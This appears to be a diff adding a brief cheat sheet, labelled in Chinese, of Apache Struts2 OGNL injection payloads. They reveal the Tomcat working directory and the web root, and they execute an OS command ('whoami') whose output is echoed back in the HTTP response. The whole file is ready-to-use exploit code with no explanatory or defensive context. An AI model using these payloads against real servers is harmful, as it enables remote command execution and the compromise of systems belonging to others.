@@ -1,0 +1,25 @@
+获取tomcat执行路径：
+%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
+
+获取Web路径：
+%{
+#req=@org.apache.struts2.ServletActionContext@getRequest(),
+#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
+#response.println(#req.getRealPath('/')),
+#response.flush(),
+#response.close()
+}
+
+执行命令：
+%{
+#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}
+
